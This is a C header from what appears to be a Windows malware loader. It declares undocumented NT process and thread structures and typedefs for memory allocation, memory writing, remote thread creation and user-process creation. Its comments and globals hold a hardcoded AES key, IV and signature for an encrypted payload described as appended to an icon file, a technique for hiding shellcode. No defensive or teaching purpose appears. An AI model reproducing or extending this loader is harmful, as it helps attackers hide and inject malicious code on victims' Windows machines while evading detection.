#pragma once
#pragma comment(lib, "ntdll")
#include <Windows.h>
#include <winternl.h>
#include <stdio.h>


/* Info about the encrypted data 
[+] Encrypted data appended to carrier: new.ico
[+] AES Key:

unsigned char Key[32] = {
    0xdc, 0x75, 0xb2, 0x23, 0x38, 0x80, 0xef, 0x14,
    0x31, 0x42, 0xd3, 0x21, 0xdd, 0x2d, 0x02, 0x2e,
    0xc2, 0xa5, 0x61, 0xe1, 0x05, 0x54, 0x14, 0x35,
    0x8b, 0xf5, 0x63, 0x13, 0x39, 0xe1, 0xd4, 0x30
};

unsigned char IV[16] = {
    0xaa, 0xa5, 0x96, 0x10, 0x08, 0x43, 0x4a, 0xe6,
    0xbe, 0xb1, 0x6f, 0xf0, 0xe2, 0x97, 0xec, 0xb7
};

BYTE SIGNATURE[4] = { 0x25, 0x02, 0x7b, 0xef };

*/

/*--------------------[MACROS]--------------------*/
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#define PRINT_WINAPI_ERR(cApiName)	printf( "[!] %s Failed With Error: %d\n", cApiName, GetLastError())
#define GET_FILENAME(cPath)			(strrchr( cPath, '\\' ) ? strrchr( cPath, '\\' ) + 1 : cPath)

#define DELETE_HANDLE(H)						\
		if (H && H != INVALID_HANDLE_VALUE) {	\
			CloseHandle(H);						\
			H = NULL;							\
	}

/*------------------[Structures]------------------*/
#define SIGNATURE_LEN 4
unsigned char Key[32] = {
    0xdc, 0x75, 0xb2, 0x23, 0x38, 0x80, 0xef, 0x14,
    0x31, 0x42, 0xd3, 0x21, 0xdd, 0x2d, 0x02, 0x2e,
    0xc2, 0xa5, 0x61, 0xe1, 0x05, 0x54, 0x14, 0x35,
    0x8b, 0xf5, 0x63, 0x13, 0x39, 0xe1, 0xd4, 0x30
};

unsigned char IV[16] = {
    0xaa, 0xa5, 0x96, 0x10, 0x08, 0x43, 0x4a, 0xe6,
    0xbe, 0xb1, 0x6f, 0xf0, 0xe2, 0x97, 0xec, 0xb7
};

BYTE SIGNATURE[SIGNATURE_LEN] = { 0x25, 0x02, 0x7b, 0xef };


typedef struct _PS_ATTRIBUTE
{
    ULONG_PTR Attribute;
    SIZE_T Size;
    union
    {
        ULONG_PTR Value;
        PVOID ValuePtr;
    };
    PSIZE_T ReturnLength;
} PS_ATTRIBUTE, * PPS_ATTRIBUTE;

typedef struct _PS_ATTRIBUTE_LIST {
    SIZE_T TotalLength;
    PS_ATTRIBUTE Attributes[1];
} PS_ATTRIBUTE_LIST, * PPS_ATTRIBUTE_LIST;

typedef LONG KPRIORITY, * PKPRIORITY;

typedef enum _KTHREAD_STATE
{
    Initialized,
    Ready,
    Running,
    Standby,
    Terminated,
    Waiting,
    Transition,
    DeferredReady,
    GateWaitObsolete,
    WaitingForProcessInSwap,
    MaximumThreadState
} KTHREAD_STATE, * PKTHREAD_STATE;

typedef enum _KWAIT_REASON
{
    Executive,               // Waiting for an executive event.
    FreePage,                // Waiting for a free page.
    PageIn,                  // Waiting for a page to be read in.
    PoolAllocation,          // Waiting for a pool allocation.
    DelayExecution,          // Waiting due to a delay execution.           // NtDelayExecution
    Suspended,               // Waiting because the thread is suspended.    // NtSuspendThread
    UserRequest,             // Waiting due to a user request.              // NtWaitForSingleObject
    WrExecutive,             // Waiting for an executive event.
    WrFreePage,              // Waiting for a free page.
    WrPageIn,                // Waiting for a page to be read in.
    WrPoolAllocation,        // Waiting for a pool allocation.
    WrDelayExecution,        // Waiting due to a delay execution.
    WrSuspended,             // Waiting because the thread is suspended.
    WrUserRequest,           // Waiting due to a user request.
    WrEventPair,             // Waiting for an event pair.                  // NtCreateEventPair
    WrQueue,                 // Waiting for a queue.                        // NtRemoveIoCompletion
    WrLpcReceive,            // Waiting for an LPC receive.
    WrLpcReply,              // Waiting for an LPC reply.
    WrVirtualMemory,         // Waiting for virtual memory.
    WrPageOut,               // Waiting for a page to be written out.
    WrRendezvous,            // Waiting for a rendezvous.
    WrKeyedEvent,            // Waiting for a keyed event.                  // NtCreateKeyedEvent
    WrTerminated,            // Waiting for thread termination.
    WrProcessInSwap,         // Waiting for a process to be swapped in.
    WrCpuRateControl,        // Waiting for CPU rate control.
    WrCalloutStack,          // Waiting for a callout stack.
    WrKernel,                // Waiting for a kernel event.
    WrResource,              // Waiting for a resource.
    WrPushLock,              // Waiting for a push lock.
    WrMutex,                 // Waiting for a mutex.
    WrQuantumEnd,            // Waiting for the end of a quantum.
    WrDispatchInt,           // Waiting for a dispatch interrupt.
    WrPreempted,             // Waiting because the thread was preempted.
    WrYieldExecution,        // Waiting to yield execution.
    WrFastMutex,             // Waiting for a fast mutex.
    WrGuardedMutex,          // Waiting for a guarded mutex.
    WrRundown,               // Waiting for a rundown.
    WrAlertByThreadId,       // Waiting for an alert by thread ID.
    WrDeferredPreempt,       // Waiting for a deferred preemption.
    WrPhysicalFault,         // Waiting for a physical fault.
    WrIoRing,                // Waiting for an I/O ring.
    WrMdlCache,              // Waiting for an MDL cache.
    WrRcu,                   // Waiting for read-copy-update (RCU) synchronization.
    MaximumWaitReason
} KWAIT_REASON, * PKWAIT_REASON;

// windows-internals-book:"Chapter 5"
typedef enum _PS_CREATE_STATE
{
    PsCreateInitialState,
    PsCreateFailOnFileOpen,
    PsCreateFailOnSectionCreate,
    PsCreateFailExeFormat,
    PsCreateFailMachineMismatch,
    PsCreateFailExeName, // Debugger specified
    PsCreateSuccess,
    PsCreateMaximumStates
} PS_CREATE_STATE;


typedef struct _PS_CREATE_INFO
{
    SIZE_T Size;
    PS_CREATE_STATE State;
    union
    {
        // PsCreateInitialState
        struct
        {
            union
            {
                ULONG InitFlags;
                struct
                {
                    UCHAR WriteOutputOnExit : 1;
                    UCHAR DetectManifest : 1;
                    UCHAR IFEOSkipDebugger : 1;
                    UCHAR IFEODoNotPropagateKeyState : 1;
                    UCHAR SpareBits1 : 4;
                    UCHAR SpareBits2 : 8;
                    USHORT ProhibitedImageCharacteristics : 16;
                };
            };
            ACCESS_MASK AdditionalFileAccess;
        } InitState;

        // PsCreateFailOnSectionCreate
        struct
        {
            HANDLE FileHandle;
        } FailSection;

        // PsCreateFailExeFormat
        struct
        {
            USHORT DllCharacteristics;
        } ExeFormat;

        // PsCreateFailExeName
        struct
        {
            HANDLE IFEOKey;
        } ExeName;

        // PsCreateSuccess
        struct
        {
            union
            {
                ULONG OutputFlags;
                struct
                {
                    UCHAR ProtectedProcess : 1;
                    UCHAR AddressSpaceOverride : 1;
                    UCHAR DevOverrideEnabled : 1; // from Image File Execution Options
                    UCHAR ManifestDetected : 1;
                    UCHAR ProtectedProcessLight : 1;
                    UCHAR SpareBits1 : 3;
                    UCHAR SpareBits2 : 8;
                    USHORT SpareBits3 : 16;
                };
            };
            HANDLE FileHandle;
            HANDLE SectionHandle;
            ULONGLONG UserProcessParametersNative;
            ULONG UserProcessParametersWow64;
            ULONG CurrentParameterFlags;
            ULONGLONG PebAddressNative;
            ULONG PebAddressWow64;
            ULONGLONG ManifestAddress;
            ULONG ManifestSize;
        } SuccessState;
    };
} PS_CREATE_INFO, * PPS_CREATE_INFO;


#define PS_ATTRIBUTE_NUMBER_MASK    0x0000ffff
#define PS_ATTRIBUTE_THREAD         0x00010000 // Attribute may be used with thread creation
#define PS_ATTRIBUTE_INPUT          0x00020000 // Attribute is input only
#define PS_ATTRIBUTE_ADDITIVE       0x00040000 // Attribute may be "accumulated", e.g. bitmasks, counters, etc.

//\
https://github.com/winsiderss/systeminformer/blob/master/phnt/include/ntpsapi.h#L1930

typedef enum _PS_ATTRIBUTE_NUM
{
    PsAttributeParentProcess,                   // in HANDLE
    PsAttributeDebugPort,                       // in HANDLE
    PsAttributeToken,                           // in HANDLE
    PsAttributeClientId,                        // out PCLIENT_ID
    PsAttributeTebAddress,                      // out PTEB
    PsAttributeImageName,                       // in PWSTR
    PsAttributeImageInfo,                       // out PSECTION_IMAGE_INFORMATION
    PsAttributeMemoryReserve,                   // in PPS_MEMORY_RESERVE
    PsAttributePriorityClass,                   // in UCHAR
    PsAttributeErrorMode,                       // in ULONG
    PsAttributeStdHandleInfo,                   // in PPS_STD_HANDLE_INFO
    PsAttributeHandleList,                      // in PHANDLE
    PsAttributeGroupAffinity,                   // in PGROUP_AFFINITY
    PsAttributePreferredNode,                   // in PUSHORT
    PsAttributeIdealProcessor,                  // in PPROCESSOR_NUMBER
    PsAttributeUmsThread,                       // see MSDN UpdateProceThreadAttributeList (CreateProcessW) - in PUMS_CREATE_THREAD_ATTRIBUTES
    PsAttributeMitigationOptions,               // in UCHAR
    PsAttributeProtectionLevel,                 // in ULONG
    PsAttributeSecureProcess,                   // since THRESHOLD (Virtual Secure Mode, Device Guard)
    PsAttributeJobList,
    PsAttributeChildProcessPolicy,              // since THRESHOLD2
    PsAttributeAllApplicationPackagesPolicy,    // since REDSTONE
    PsAttributeWin32kFilter,
    PsAttributeSafeOpenPromptOriginClaim,
    PsAttributeBnoIsolation,
    PsAttributeDesktopAppPolicy,
    PsAttributeMax
} PS_ATTRIBUTE_NUM;

//\
https://github.com/winsiderss/systeminformer/blob/master/phnt/include/ntpsapi.h#L1974

#define PsAttributeValue(Number, Thread, Input, Additive)		\
    (((Number) & PS_ATTRIBUTE_NUMBER_MASK)	|					\
    ((Thread) ? PS_ATTRIBUTE_THREAD : 0)	|					\
    ((Input) ? PS_ATTRIBUTE_INPUT : 0)		|					\
    ((Additive) ? PS_ATTRIBUTE_ADDITIVE : 0))

// Specifies the parent process of the new process
#define PS_ATTRIBUTE_PARENT_PROCESS \
    PsAttributeValue(PsAttributeParentProcess, FALSE, TRUE, TRUE)
// Specifies the debug port to use
#define PS_ATTRIBUTE_DEBUG_PORT \
    PsAttributeValue(PsAttributeDebugPort, FALSE, TRUE, TRUE)
// Specifies the token to assign to the new process
#define PS_ATTRIBUTE_TOKEN \
    PsAttributeValue(PsAttributeToken, FALSE, TRUE, TRUE)
// Specifies the client ID to assign to the new process
#define PS_ATTRIBUTE_CLIENT_ID \
    PsAttributeValue(PsAttributeClientId, TRUE, FALSE, FALSE)
// Specifies the TEB address to use for the new process
#define PS_ATTRIBUTE_TEB_ADDRESS \
    PsAttributeValue(PsAttributeTebAddress, TRUE, FALSE, FALSE)
// Specifies the image name of the new process
#define PS_ATTRIBUTE_IMAGE_NAME \
    PsAttributeValue(PsAttributeImageName, FALSE, TRUE, FALSE)
// Specifies the image information of the new process
#define PS_ATTRIBUTE_IMAGE_INFO \
    PsAttributeValue(PsAttributeImageInfo, FALSE, FALSE, FALSE)
// Specifies the amount of memory to reserve for the new process
#define PS_ATTRIBUTE_MEMORY_RESERVE \
    PsAttributeValue(PsAttributeMemoryReserve, FALSE, TRUE, FALSE)
// Specifies the priority class to use for the new process
#define PS_ATTRIBUTE_PRIORITY_CLASS \
    PsAttributeValue(PsAttributePriorityClass, FALSE, TRUE, FALSE)
// Specifies the error mode to use for the new process
#define PS_ATTRIBUTE_ERROR_MODE \
    PsAttributeValue(PsAttributeErrorMode, FALSE, TRUE, FALSE)
// Specifies the standard handle information to use for the new process
#define PS_ATTRIBUTE_STD_HANDLE_INFO \
    PsAttributeValue(PsAttributeStdHandleInfo, FALSE, TRUE, FALSE)
// Specifies the handle list to use for the new process
#define PS_ATTRIBUTE_HANDLE_LIST \
    PsAttributeValue(PsAttributeHandleList, FALSE, TRUE, FALSE)
// Specifies the group affinity to use for the new process
#define PS_ATTRIBUTE_GROUP_AFFINITY \
    PsAttributeValue(PsAttributeGroupAffinity, TRUE, TRUE, FALSE)
// Specifies the preferred NUMA node to use for the new process
#define PS_ATTRIBUTE_PREFERRED_NODE \
    PsAttributeValue(PsAttributePreferredNode, FALSE, TRUE, FALSE)
// Specifies the ideal processor to use for the new process
#define PS_ATTRIBUTE_IDEAL_PROCESSOR \
    PsAttributeValue(PsAttributeIdealProcessor, TRUE, TRUE, FALSE)
// Specifies the process mitigation options to use for the new process
#define PS_ATTRIBUTE_MITIGATION_OPTIONS \
    PsAttributeValue(PsAttributeMitigationOptions, FALSE, TRUE, FALSE)
// Specifies the protection level to use for the new process
#define PS_ATTRIBUTE_PROTECTION_LEVEL \
    PsAttributeValue(PsAttributeProtectionLevel, FALSE, TRUE, FALSE)
// Specifies the UMS thread to associate with the new process
#define PS_ATTRIBUTE_UMS_THREAD \
    PsAttributeValue(PsAttributeUmsThread, TRUE, TRUE, FALSE)
// Specifies whether the new process is a secure process
#define PS_ATTRIBUTE_SECURE_PROCESS \
    PsAttributeValue(PsAttributeSecureProcess, FALSE, TRUE, FALSE)
// Specifies the job list to associate with the new process
#define PS_ATTRIBUTE_JOB_LIST \
    PsAttributeValue(PsAttributeJobList, FALSE, TRUE, FALSE)
// Specifies the child process policy to use for the new process
#define PS_ATTRIBUTE_CHILD_PROCESS_POLICY \
    PsAttributeValue(PsAttributeChildProcessPolicy, FALSE, TRUE, FALSE)
// Specifies the all application packages policy to use for the new process
#define PS_ATTRIBUTE_ALL_APPLICATION_PACKAGES_POLICY \
    PsAttributeValue(PsAttributeAllApplicationPackagesPolicy, FALSE, TRUE, FALSE)
// Specifies the child process should have access to the Win32k subsystem.
#define PS_ATTRIBUTE_WIN32K_FILTER	\
    PsAttributeValue(PsAttributeWin32kFilter, FALSE, TRUE, FALSE)
// Specifies the child process is allowed to claim a specific origin when making a safe file open prompt
#define PS_ATTRIBUTE_SAFE_OPEN_PROMPT_ORIGIN_CLAIM	\
    PsAttributeValue(PsAttributeSafeOpenPromptOriginClaim, FALSE, TRUE, FALSE)
// Specifies the child process is isolated using the BNO framework
#define PS_ATTRIBUTE_BNO_ISOLATION	\
    PsAttributeValue(PsAttributeBnoIsolation, FALSE, TRUE, FALSE)
// Specifies that the child's process desktop application policy  
#define PS_ATTRIBUTE_DESKTOP_APP_POLICY	\
    PsAttributeValue(PsAttributeDesktopAppPolicy, FALSE, TRUE, FALSE)


//\
https://github.com/winsiderss/systeminformer/blob/master/phnt/include/ntpsapi.h#L1315

#define PROCESS_CREATE_FLAGS_BREAKAWAY 0x00000001 // NtCreateProcessEx & NtCreateUserProcess
#define PROCESS_CREATE_FLAGS_NO_DEBUG_INHERIT 0x00000002 // NtCreateProcessEx & NtCreateUserProcess
#define PROCESS_CREATE_FLAGS_INHERIT_HANDLES 0x00000004 // NtCreateProcessEx & NtCreateUserProcess
#define PROCESS_CREATE_FLAGS_PROTECTED_PROCESS 0x00000040 // NtCreateUserProcess only
#define PROCESS_CREATE_FLAGS_CREATE_SESSION 0x00000080 // NtCreateProcessEx & NtCreateUserProcess, requires SeLoadDriver
#define PROCESS_CREATE_FLAGS_INHERIT_FROM_PARENT 0x00000100 // NtCreateProcessEx & NtCreateUserProcess
#define PROCESS_CREATE_FLAGS_SUSPENDED 0x00000200 // NtCreateProcessEx & NtCreateUserProcess
#define PROCESS_CREATE_FLAGS_FORCE_BREAKAWAY 0x00000400 // NtCreateProcessEx & NtCreateUserProcess, requires SeTcb
#define PROCESS_CREATE_FLAGS_RELEASE_SECTION 0x00001000 // NtCreateProcessEx & NtCreateUserProcess
#define PROCESS_CREATE_FLAGS_AUXILIARY_PROCESS 0x00008000 // NtCreateProcessEx & NtCreateUserProcess, requires SeTcb
#define PROCESS_CREATE_FLAGS_CREATE_STORE 0x00020000 // NtCreateProcessEx & NtCreateUserProcess
#define PROCESS_CREATE_FLAGS_USE_PROTECTED_ENVIRONMENT 0x00040000 // NtCreateProcessEx & NtCreateUserProcess
#define THREAD_CREATE_FLAGS_CREATE_SUSPENDED 0x00000001 // NtCreateUserProcess & NtCreateThreadEx



//\
https://github.com/winsiderss/systeminformer/blob/master/phnt/include/ntrtl.h#L2688


#define RTL_USER_PROC_PARAMS_NORMALIZED 0x00000001	// indicates that the parameters passed to the process are already in a normalized form
#define RTL_USER_PROC_PROFILE_USER 0x00000002		// enables user-mode profiling for the process
#define RTL_USER_PROC_PROFILE_KERNEL 0x00000004		// enables kernel-mode profiling for the process
#define RTL_USER_PROC_PROFILE_SERVER 0x00000008		// enables server-mode profiling for the process
#define RTL_USER_PROC_RESERVE_1MB 0x00000020		// reserves 1 megabyte (MB) of virtual address space for the process
#define RTL_USER_PROC_RESERVE_16MB 0x00000040		// reserves 16 MB of virtual address space for the process
#define RTL_USER_PROC_CASE_SENSITIVE 0x00000080		// sets the process to be case-sensitive
#define RTL_USER_PROC_DISABLE_HEAP_DECOMMIT 0x00000100	// disables heap decommitting for the process
#define RTL_USER_PROC_DLL_REDIRECTION_LOCAL 0x00001000	// enables local DLL redirection for the process
#define RTL_USER_PROC_APP_MANIFEST_PRESENT 0x00002000	// indicates that an application manifest is present for the process
#define RTL_USER_PROC_IMAGE_KEY_MISSING 0x00004000	// indicates that the image key is missing for the process
#define RTL_USER_PROC_OPTIN_PROCESS 0x00020000		// indicates that the process has opted in to some specific behavior or feature


/*----------------[Functions Prototype]----------------*/

//----------------[VirtualAlloc]-----------------//
typedef NTSTATUS(NTAPI* NtAllocateVirtualMemory)(
    _In_ HANDLE ProcessHandle,
    _Inout_ _At_(*BaseAddress, _Readable_bytes_(*RegionSize) _Writable_bytes_(*RegionSize) _Post_readable_byte_size_(*RegionSize)) PVOID* BaseAddress,
    _In_ ULONG_PTR ZeroBits,
    _Inout_ PSIZE_T RegionSize,
    _In_ ULONG AllocationType,
    _In_ ULONG PageProtection
    );


//----------------[VirtualProtect]-----------------//
typedef NTSTATUS(NTAPI* NtProtectVirtualMemory)(
    _In_ HANDLE ProcessHandle,
    _Inout_ PVOID* BaseAddress,
    _Inout_ PSIZE_T RegionSize,
    _In_ ULONG NewProtection,
    _Out_ PULONG OldProtection
    );


//-------------[WriteProcessMemory]-------------// 
typedef NTSTATUS(NTAPI* NtWriteVirtualMemory)(
    _In_ HANDLE ProcessHandle,
    _In_opt_ PVOID BaseAddress,
    _In_reads_bytes_(NumberOfBytesToWrite) PVOID Buffer,
    _In_ SIZE_T NumberOfBytesToWrite,
    _Out_opt_ PSIZE_T NumberOfBytesWritten
    );


//---------------[CreateThreadEx]---------------//
typedef NTSTATUS(NTAPI* NtCreateThreadEx)(
    _Out_ PHANDLE ThreadHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_ HANDLE ProcessHandle,
    _In_ PVOID StartRoutine, // PUSER_THREAD_START_ROUTINE
    _In_opt_ PVOID Argument,
    _In_ ULONG CreateFlags, // THREAD_CREATE_FLAGS_*
    _In_ SIZE_T ZeroBits,
    _In_ SIZE_T StackSize,
    _In_ SIZE_T MaximumStackSize,
    _In_opt_ PPS_ATTRIBUTE_LIST AttributeList
    );


//---------------[CreateUserProcess]----------------//
typedef NTSTATUS(NTAPI* fnRtlCreateProcessParametersEx)(

    PRTL_USER_PROCESS_PARAMETERS* pProcessParameters,
    PUNICODE_STRING					ImagePathName,
    PUNICODE_STRING					DllPath,
    PUNICODE_STRING					CurrentDirectory,
    PUNICODE_STRING					CommandLine,
    PVOID							Environment,
    PUNICODE_STRING					WindowTitle,
    PUNICODE_STRING					DesktopInfo,
    PUNICODE_STRING					ShellInfo,
    PUNICODE_STRING					RuntimeData,
    ULONG							Flags

    );


//\
https://github.com/winsiderss/systeminformer/blob/master/phnt/include/ntpsapi.h#L2288

typedef NTSTATUS(NTAPI* fnNtCreateUserProcess)(

    PHANDLE							ProcessHandle,
    PHANDLE							ThreadHandle,
    ACCESS_MASK						ProcessDesiredAccess,
    ACCESS_MASK						ThreadDesiredAccess,
    POBJECT_ATTRIBUTES				ProcessObjectAttributes,
    POBJECT_ATTRIBUTES				ThreadObjectAttributes,
    ULONG							ProcessFlags,
    ULONG							ThreadFlags,
    PRTL_USER_PROCESS_PARAMETERS	ProcessParameters,
    PPS_CREATE_INFO					CreateInfo,
    PPS_ATTRIBUTE_LIST				pAttributeList

    );


typedef NTSTATUS(NTAPI* RtlWow64GetThreadContext)(
	_In_ HANDLE hThread,
	_Inout_ PCONTEXT Context
	);